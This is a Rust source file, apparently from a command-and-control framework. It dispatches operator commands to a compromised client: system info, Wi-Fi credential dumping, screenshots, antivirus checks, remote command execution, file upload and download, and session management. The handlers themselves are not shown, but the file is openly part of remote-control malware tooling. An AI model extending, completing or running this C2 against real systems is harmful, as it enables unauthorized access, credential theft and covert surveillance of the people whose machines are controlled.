use crate::{
    c2_state::C2State,
    constants::{BOLD, DIM, RED, RESET, WHITE, YELLOW},
};
use std::net::TcpStream;

pub mod client;
pub mod server;

pub fn dispatch_client(instruct: Vec<&str>, conn: &mut TcpStream, state: &C2State ) -> Result<bool, String> {
    match instruct.first() {
        // Local commands
        Some(&"lcd") => server::local::local_cd(&instruct),
        Some(&"lls") => server::local::local_list(),
        Some(&"lpwd") => server::local::local_pwd(),
        Some(&"clear") => server::local::clear_console(),
        Some(&"help") => server::local::help_panel(),

        // System commands
        Some(&"sysinfo") => client::system::sysinfo(conn),
        Some(&"wifidump") => client::system::wifidump(conn),
        Some(&"check") => client::system::check_permissions(conn),
        Some(&"display") => client::system::display(&instruct, conn),
        Some(&"screenshot") => client::system::screenshot(conn, state),
        Some(&"av") => client::system::av(conn),

        // Shell mode
        Some(&"exec") => client::exec::run(conn, &instruct),
        // Some(&"shell") => client::shell::run(conn, state),

        // File system
        Some(&"download") => client::filesystem::download(&instruct, conn, state),
        Some(&"upload") => client::filesystem::upload(&instruct, conn),

        // Close
        Some(&"close") => client::control::close_session(conn, state, true),
        _ => {
            println!("\n\t{}[{}!{}>{}]{} Incorrect instruction: {}{}\n", YELLOW, RED, BOLD, YELLOW, YELLOW, RESET, instruct.join(" "));
            Ok(true)
        }
    }
}

pub fn dispatch_server(instruct: Vec<&str>, state: &C2State) -> Result<bool, String> {
    match instruct.first() {
        // Local commands
        Some(&"lcd") => server::local::local_cd(&instruct),
        Some(&"lls") => server::local::local_list(),
        Some(&"lpwd") => server::local::local_pwd(),
        Some(&"clear") => server::local::clear_console(),
        Some(&"help") => server::local::help_panel(),

        // Session commands
        Some(&"sessions") => server::sessions::list_sessions(state),
        Some(&"session") => server::sessions::set_session(instruct, state),

        // Control commands
        _ => {
            println!(
                "\n\t{DIM}[{RESET}{RED}err{RESET}{DIM}]{RESET} {YELLOW}Incorrect instruction:{RESET} {WHITE}{}{RESET}\n",
                instruct.join(" ")
            );
            Ok(true)
        }
    }
}
